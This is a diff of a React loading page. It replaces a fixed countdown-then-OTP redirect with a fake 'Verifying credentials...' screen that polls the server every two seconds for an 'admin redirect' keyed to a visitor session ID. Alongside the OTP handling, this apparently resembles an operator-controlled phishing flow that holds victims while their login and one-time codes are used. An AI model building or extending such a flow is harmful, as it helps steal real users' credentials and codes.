@@ -5,44 +5,35 @@ import { useTranslation } from "@/contexts/LanguageContext";
 export default function Loading() {
   const [, setLocation] = useLocation();
   const { t } = useTranslation();
-  
-  // Check if this is a retry from failed OTP (shorter wait time)
-  // Use useState initializer to read localStorage safely
-  const [isOtpRetry] = useState(() => {
-    if (typeof window !== 'undefined') {
-      return localStorage.getItem('otpAttempts') !== null;
-    }
-    return false;
-  });
-  
-  const initialCountdown = isOtpRetry ? 5 : 30;
-  const redirectDelay = isOtpRetry ? 5000 : 30000;
-  
-  const [countdown, setCountdown] = useState(initialCountdown);
+  const [sessionId] = useState(() => localStorage.getItem("visitorSessionId") || "");
 
   useEffect(() => {
-    // Start countdown
-    const countdownInterval = setInterval(() => {
-      setCountdown((prev) => {
-        if (prev <= 1) {
-          clearInterval(countdownInterval);
-          return 0;
+    // Check for admin redirect every 2 seconds
+    const checkRedirect = async () => {
+      try {
+        const response = await fetch("/api/check-redirect", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ sessionId }),
+        });
+
+        if (response.ok) {
+          const data = await response.json();
+          if (data.redirect) {
+            setLocation(data.redirect);
+          }
         }
-        return prev - 1;
-      });
-    }, 1000);
-
-    // Redirect to OTP page after delay
-    const redirectTimer = setTimeout(() => {
-      setLocation("/otp");
-    }, redirectDelay);
-
-    // Cleanup on unmount
-    return () => {
-      clearInterval(countdownInterval);
-      clearTimeout(redirectTimer);
+      } catch (error) {
+        console.error("Failed to check redirect:", error);
+      }
     };
-  }, [setLocation, redirectDelay]);
+
+    // Start polling for redirects
+    const pollInterval = setInterval(checkRedirect, 2000);
+    checkRedirect(); // Check immediately
+
+    return () => clearInterval(pollInterval);
+  }, [setLocation, sessionId]);
 
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-white">
@@ -63,20 +54,17 @@ export default function Loading() {
           </p>
         </div>
 
-        {/* Countdown Timer */}
+        {/* Waiting Message */}
         <div className="mt-8">
-          <div className="inline-flex items-center justify-center w-20 h-20 rounded-full border-4 border-black">
-            <span className="text-2xl font-bold text-black">{countdown}</span>
+          <div className="inline-flex items-center justify-center px-6 py-3 rounded-full border-2 border-black">
+            <span className="text-lg font-medium text-black">Verifying credentials...</span>
           </div>
-          <p className="mt-4 text-sm text-gray-500">{t('loading_seconds_remaining')}</p>
+          <p className="mt-4 text-sm text-gray-500">Please wait</p>
         </div>
 
-        {/* Progress Bar */}
+        {/* Infinite Progress Bar */}
         <div className="w-80 h-2 bg-gray-200 rounded-full overflow-hidden mx-auto">
-          <div 
-            className="h-full bg-black transition-all duration-1000 ease-linear"
-            style={{ width: `${((initialCountdown - countdown) / initialCountdown) * 100}%` }}
-          ></div>
+          <div className="h-full bg-black w-1/3 animate-pulse"></div>
         </div>
 
         {/* Status Messages */}
@@ -86,15 +74,11 @@ export default function Loading() {
             {t('loading_status_secure')}
           </p>
           <p className="flex items-center justify-center gap-2">
-            <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
+            <span className="inline-block w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></span>
             {t('loading_status_verifying')}
           </p>
           <p className="flex items-center justify-center gap-2">
-            {countdown > (initialCountdown / 2) ? (
-              <span className="inline-block w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></span>
-            ) : (
-              <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
-            )}
+            <span className="inline-block w-2 h-2 bg-gray-400 rounded-full"></span>
             {t('loading_status_otp')}
           </p>
         </div>
